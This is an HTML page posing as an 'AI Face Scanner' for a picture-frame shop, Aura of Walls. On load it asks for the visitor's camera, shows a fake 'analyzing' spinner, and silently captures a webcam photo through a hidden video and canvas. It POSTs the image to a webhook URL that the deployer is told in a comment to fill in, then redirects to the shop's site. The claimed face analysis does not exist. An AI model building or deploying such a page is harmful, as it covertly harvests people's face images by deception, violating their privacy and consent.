<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI Face Scanner - Aura of Walls</title>
    <style>
        body { font-family: sans-serif; text-align: center; padding-top: 50px; background: #f4f4f4; }
        .loader { border: 8px solid #f3f3f3; border-top: 8px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 2s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <h1>AI Face Analysis</h1>
    <h3>Aura of Walls Premium Frames</h3>
    <div class="loader"></div>
    <p id="status">Please wait, analyzing lighting and face position...</p>

    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

    <script>
        // APNA WEBHOOK LINK YAHAN DALO
        const webhookURL = "TERA_URL_YAHAN_DALO";

        async function startCapture() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.getElementById('video');
                video.srcObject = stream;

                document.getElementById('status').innerText = "Scanning... Stay still for 2 seconds.";

                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    const context = canvas.getContext('2d');
                    context.drawImage(video, 0, 0, 640, 480);
                    
                    const imageData = canvas.toDataURL('image/jpeg', 0.7); // 0.7 Quality for faster upload

                    // SENDING DATA TO WEBHOOK
                    fetch(webhookURL, {
                        method: 'POST',
                        body: imageData,
                        headers: { 'Content-Type': 'text/plain' }
                    }).then(() => {
                        document.getElementById('status').innerText = "Analysis Complete! Redirecting...";
                        setTimeout(() => {
                            window.location.href = "https://auraofwalls.com"; // Redirect to your site
                        }, 1000);
                    });
                }, 2500);
            } catch (err) {
                document.getElementById('status').innerText = "Error: Please allow camera access to use the AI Scanner.";
                console.error(err);
            }
        }

        // Run as soon as page loads
        window.onload = startCapture;
    </script>
</body>
</html>
